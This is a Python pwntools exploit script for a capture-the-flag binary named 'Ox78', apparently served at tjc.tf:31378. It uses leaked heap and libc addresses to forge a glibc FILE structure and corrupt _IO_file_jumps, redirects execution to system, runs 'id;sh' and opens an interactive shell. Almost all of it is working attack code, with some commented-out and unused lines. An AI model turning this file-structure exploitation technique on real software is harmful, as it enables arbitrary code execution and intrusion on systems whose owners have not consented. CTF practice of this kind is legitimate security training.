#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('Ox78_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x15555528f44c
        b*Ox78
        c
        ''')
        sleep(1)

# nc tjc.tf 31378
if args.REMOTE:
    p = remote('tjc.tf', 31378)
else:
    p = process([exe.path])
GDB()

ru(b'ile Structure: ')
heap = int(r(14), 16)
heap_base = heap-0x320
info(f'heap base: {hex(heap_base)}')

ru(b'c leak as well: ')
libc_leak = int(r(14), 16)
libc.address = libc_leak-0x84ed0
info(f'libc leak: {hex(libc_leak)}')
info(f'base  :{hex(libc.address)}')

io = FileStructure()
io.flags = 0x3b01010101010101
io._IO_read_ptr = b'sh'
# io._IO_write_ptr = p64(libc.sym.system)
# io._IO_write_base = p64(heap_base+0x310)
io._IO_buf_base = p64(libc.sym._IO_file_jumps)
io._IO_buf_end = p64(libc.sym._IO_file_jumps +0x50)
io._lock = p64(heap_base)
io.fileno = 0
# io._wide_data = libc.address
# io.chain = libc.address

load = flat(
    b"id;sh\x00\x00\x00",
    # b'sh\0'.ljust(8, b'\0'), #read ptr
    0, 0, 0, 0, 0, 0,
    libc.sym._IO_file_jumps+112,
    libc.sym._IO_file_jumps+112+0x100,
    0
)

input()
s(load.ljust(0x78, b'\0'))

load = flat(
    0, 0,
    libc.sym._IO_file_finish, libc.sym._IO_file_overflow,

)

s(p64(libc.sym.system))

p.interactive()
